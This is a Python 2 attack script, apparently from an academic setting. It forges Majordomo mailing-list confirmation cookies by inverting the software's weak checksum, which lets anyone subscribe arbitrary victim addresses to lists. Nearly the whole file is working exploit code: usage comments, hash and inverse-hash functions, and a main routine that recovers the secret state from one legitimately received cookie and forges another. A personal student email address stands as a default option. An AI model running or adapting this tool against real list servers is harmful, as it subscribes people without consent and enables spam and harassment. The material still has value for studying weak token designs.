# vim: tabstop=8 expandtab shiftwidth=4 softtabstop=4
"""Subscribe arbitrary users to Majordomo"""

# Generate a cookie for the algorithm with addition
# python hack_majordomo.py God@heaven.af.mil

# Generate a cookie for the algorithm with XOR
# python hack_majordomo.py -x God@heaven.af.mil

# Generate a cookie using our own e-mail address and received cookie
# python hack_majordomo.py -e real@user.mail real@user.mail
# python hack_majordomo.py -e real@user.mail -c <cookie> God@heaven.af.mil

def truncate(number, bits):
    """Truncate value to a certain number of bits"""
    bitstring = "{0:0b}".format(number)
    truncated_bitstring = bitstring[-bits:]
    return int(truncated_bitstring, 2)

def h(secret, address, use_xor=False, initial_value=0):
    """ Silly 'hash' function"""
    value = initial_value
    for byte in (secret+address):
        if use_xor:
            value ^= ord(byte)
        else:
            value += ord(byte)
        carry = (value >> 28) & 0xf
        value <<= 4 
        value |= carry
        # Assume we are on a native 32-bit machine
        value = truncate(value, 32)
    return value

def inv_h(cookie, address, use_xor=False):
    """Invert silly hash functions"""
    value = cookie
    for byte in reversed(address):
        carry = value & 0xf
        value >>= 4 
        value |= carry << 28
        if use_xor:
            value ^= ord(byte)
        else:
            value -= ord(byte)
    return value

def main():
    """Forge cookies for Majordomo list subscription"""
    import optparse
    import os

    parser = optparse.OptionParser(usage="usage: %prog [options] victim e-mail")
    parser.add_option('-x', '--xor', help="Do XOR instead of addition",
                      action="store_true", dest="use_xor", default=False)
    parser.add_option('-e', '--email',
                      help="E-mail address we can access to get cookies",
                      dest="my_email", default="aram.verstegen@student.ru.nl")
    parser.add_option('-c', '--cookie',
                      help="A cookie received on the address specified with -e",
                      dest="cookie", default=None, type="int")
    parser.add_option('-s', '--secret', help="A secret value",
                      dest="secret", default=os.path.expanduser("~"))
    options, args = parser.parse_args()

    if len(args):
        address_string = args[0]
    else:
        print "You must supply an address to subscribe to the list"
        return

    real_cookie = h(options.secret, address_string, options.use_xor)
    print "Real cookie: %s" % real_cookie
    if options.my_email == address_string:
        return

    if not options.cookie or not options.my_email:
        options.cookie = h(options.secret, options.my_email, options.use_xor)
        print "Let's suppose we received a mail with code %s" % options.cookie
        print "For our own address %s" % options.my_email

    secret_state = h(options.secret, "", options.use_xor)
    recovered_state = inv_h(options.cookie, options.my_email, options.use_xor)
    assert recovered_state == secret_state
    forged_cookie = h("", address_string, options.use_xor, recovered_state)
    print "Forged cookie: %s" % forged_cookie
    assert forged_cookie == real_cookie

if __name__ == "__main__":
    main()

